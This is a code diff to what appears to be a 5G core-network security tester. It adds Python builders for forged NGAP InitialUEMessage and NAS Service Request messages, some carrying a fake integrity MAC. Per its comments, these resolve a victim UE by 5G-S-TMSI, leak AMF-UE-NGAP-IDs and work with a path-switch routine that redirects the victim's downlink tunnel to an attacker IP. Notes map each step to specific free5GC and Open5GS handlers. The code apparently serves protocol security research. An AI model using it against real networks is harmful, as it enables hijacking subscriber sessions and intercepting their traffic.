@@ -255,6 +255,9 @@ def path_switch_request(source_amf_ue_id: int, ran_ue_id: int, cfg: dict, *,
     `attacker_ip`/`teid` and returns {NH, NCC} + the UPF N3 TEID in the ACK.
     `pdu_sessions` are the victim PDU Session IDs to switch (each carries our
     DL tunnel). Reply decoded by ngaptester.decode.path_switch_ack_leak().
+
+    Binding note: free5GC SwitchToRan / Open5GS ran_ue_switch_to_gnb only move
+    Ran + RanUeNgapId; the existing AmfUeNgapId is preserved on the same context.
     """
     transfer = path_switch_request_transfer(attacker_ip, teid, qfis)
     switched = [{"pDUSessionID": int(pid), "pathSwitchRequestTransfer": transfer}
@@ -276,6 +279,153 @@ def path_switch_request(source_amf_ue_id: int, ran_ue_id: int, cfg: dict, *,
     return ("initiatingMessage", {
         "procedureCode": 25, "criticality": "reject",
         "value": ("PathSwitchRequest", {"protocolIEs": ies}),
+    })
+
+
+def _tmsi_to_bytes(tmsi) -> bytes:
+    """Normalize tmsi (int / 8-hex / bytes) to 4 octets."""
+    if isinstance(tmsi, int):
+        tmsi_b = int(tmsi).to_bytes(4, "big")
+    elif isinstance(tmsi, str):
+        tmsi_b = bytes.fromhex(tmsi)
+    else:
+        tmsi_b = bytes(tmsi)
+    if len(tmsi_b) != 4:
+        raise ValueError(f"5G-TMSI must be 4 octets, got {len(tmsi_b)}")
+    return tmsi_b
+
+
+def five_g_s_tmsi(amf_set_id: int, amf_pointer: int, tmsi) -> dict:
+    """Build FiveG-S-TMSI IE value: AMFSetID(10b) + AMFPointer(6b) + 5G-TMSI(4).
+
+    `tmsi` may be int, 8-hex string, or 4 bytes. Used by InitialUEMessage to
+    resolve an existing AmfUe/GUTI without knowing AMF-UE-NGAP-ID.
+    """
+    return {
+        "aMFSetID": (int(amf_set_id) & 0x3FF, 10),
+        "aMFPointer": (int(amf_pointer) & 0x3F, 6),
+        "fiveG-TMSI": _tmsi_to_bytes(tmsi),
+    }
+
+
+def service_request_nas(amf_set_id: int, amf_pointer: int, tmsi, *,
+                        service_type: int = 1,
+                        ngksi: int = 1,
+                        uplink_psi: tuple | list | None = None):
+    """Build a *structurally complete* plain 5GMM SERVICE REQUEST (TS 24.501 8.2.16).
+
+    Layout (security header = 0, not integrity-protected — attacker has no Knas):
+      7E          EPD (5GMM)
+      00          Security header type = plain
+      4C          Message type = Service request
+      ST|ngKSI    Service type (high nibble) + ngKSI (low nibble)
+      00 07       LV-E length of 5GS mobile identity (=7)
+      03          Type of identity = 5G-S-TMSI
+      Set|Ptr     AMF Set ID (10b) + AMF Pointer (6b)
+      TMSI        5G-TMSI (4 octets)
+      [40 len psi] optional Uplink data status (IEI 0x40) — NOT cleartext-OK
+                   on InitialUE; omit by default (Open5GS rejects 0x5F if present)
+
+    Purpose in the tester: get past NAS *decode* so the AMF may answer with
+    DownlinkNASTransport carrying Service Reject + 5GMM cause (and thereby
+    expose the new AMF-UE-NGAP-ID). Integrity will still fail — that is expected.
+    """
+    tmsi_b = _tmsi_to_bytes(tmsi)
+    set_id = int(amf_set_id) & 0x3FF
+    pointer = int(amf_pointer) & 0x3F
+    # Pack Set(10)+Pointer(6) into 2 octets (same packing as NGAP FiveG-S-TMSI).
+    amf_id_u16 = ((set_id & 0x3FF) << 6) | (pointer & 0x3F)
+    st_ngksi = ((int(service_type) & 0x0F) << 4) | (int(ngksi) & 0x0F)
+    # 5GS mobile identity contents for type 5G-S-TMSI (24.501 Fig. 9.11.3.4.5)
+    identity = bytes([
+        0x03,  # spare(4)=0 | type of identity=5G-S-TMSI(3)
+        (amf_id_u16 >> 8) & 0xFF,
+        amf_id_u16 & 0xFF,
+    ]) + tmsi_b
+    assert len(identity) == 7
+    nas = bytearray([
+        0x7E, 0x00, 0x4C, st_ngksi,
+        0x00, 0x07,  # LV-E length
+    ])
+    nas.extend(identity)
+    if uplink_psi:
+        # IEI 0x40 Uplink data status, length 2, PSI bitmap (PSI1 = bit0 of octet1)
+        bitmap0 = 0
+        bitmap1 = 0
+        for psi in uplink_psi:
+            p = int(psi)
+            if 1 <= p <= 8:
+                bitmap0 |= 1 << (p - 1)
+            elif 9 <= p <= 16:
+                bitmap1 |= 1 << (p - 9)
+        nas.extend([0x40, 0x02, bitmap0, bitmap1])
+    return bytes(nas)
+
+
+def service_request_nas_integrity_protected(
+        amf_set_id: int, amf_pointer: int, tmsi, *,
+        service_type: int = 1, ngksi: int = 1,
+        uplink_psi: tuple | list | None = (1,),
+        mac: bytes = b"\x00\x00\x00\x00",
+        seq: int = 0):
+    """Integrity-protected (sec-hdr=1) Service Request with *fake* MAC.
+
+    free5GC InitialUE path requires SecurityHeaderTypeIntegrityProtected for
+    Service Request (nas_security/security.go); plain (0x0) is rejected as
+    wrong security header *without* DL. A wrong MAC still fails verification,
+    but gets further along the decoder — useful as a DL-elicitation probe.
+    Open5GS often answers plain/failed-integrity SR with Service Reject + cause.
+    """
+    plain = service_request_nas(
+        amf_set_id, amf_pointer, tmsi,
+        service_type=service_type, ngksi=ngksi, uplink_psi=uplink_psi)
+    if len(mac) != 4:
+        raise ValueError("NAS MAC must be 4 octets")
+    # 7E | sec-hdr=1 (Integrity protected) | MAC(4) | SQN(1) | plain NAS
+    return bytes([0x7E, 0x01]) + bytes(mac) + bytes([int(seq) & 0xFF]) + plain
+
+
+def initial_ue_message(ran_ue_id: int, cfg: dict, *,
+                       amf_set_id: int, amf_pointer: int, tmsi,
+                       nas_pdu: bytes | None = None,
+                       rrc_cause: str = "mo-Signalling",
+                       nci: int | None = None,
+                       ue_context_request: bool = True):
+    """INITIAL UE MESSAGE (Class 2, procedureCode 15).
+
+    Contrast binding primitive vs Path Switch:
+      - Always allocates a *new* RanUe (and thus a new AmfUeNgapId on free5GC
+        NewRanUe / Open5GS ran_ue_add).
+      - Resolves the victim AmfUe by FiveG-S-TMSI (not by AMF-UE-NGAP-ID).
+      - free5GC CM-CONNECTED: HoldingAmfUe only; HandleNAS then NewAmfUe("") so
+        the victim's serving RanUe is *not* stolen (nas/handler.go:40-48).
+      - Open5GS: amf_ue_associate_ran_ue after HOLDING_NG_CONTEXT — serving NG
+        moves, but AMF_UE_NGAP_ID on the new ran_ue is freshly allocated.
+      - Needs a forgeable/observable 5G-S-TMSI and a NAS-PDU; fake NAS usually
+        fails integrity → fragile follow-up attacks.
+
+    Default NAS is a structurally complete plain Service Request (same 5G-S-TMSI)
+    so AMF NAS decoders get past EOF; still unsigned → expect Service Reject.
+    """
+    if nas_pdu is None:
+        nas_pdu = service_request_nas(amf_set_id, amf_pointer, tmsi)
+    ies = [
+        {"id": 85, "criticality": "reject", "value": ("RAN-UE-NGAP-ID", ran_ue_id)},
+        {"id": 38, "criticality": "reject", "value": ("NAS-PDU", nas_pdu)},
+        {"id": 121, "criticality": "reject",
+         "value": ("UserLocationInformation", _uli_nr(cfg, nci))},
+        {"id": 90, "criticality": "ignore",
+         "value": ("RRCEstablishmentCause", rrc_cause)},
+        {"id": 26, "criticality": "reject",
+         "value": ("FiveG-S-TMSI",
+                   five_g_s_tmsi(amf_set_id, amf_pointer, tmsi))},
+    ]
+    if ue_context_request:
+        ies.append({"id": 112, "criticality": "ignore",
+                    "value": ("UEContextRequest", "requested")})
+    return ("initiatingMessage", {
+        "procedureCode": 15, "criticality": "ignore",
+        "value": ("InitialUEMessage", {"protocolIEs": ies}),
     })
 
 
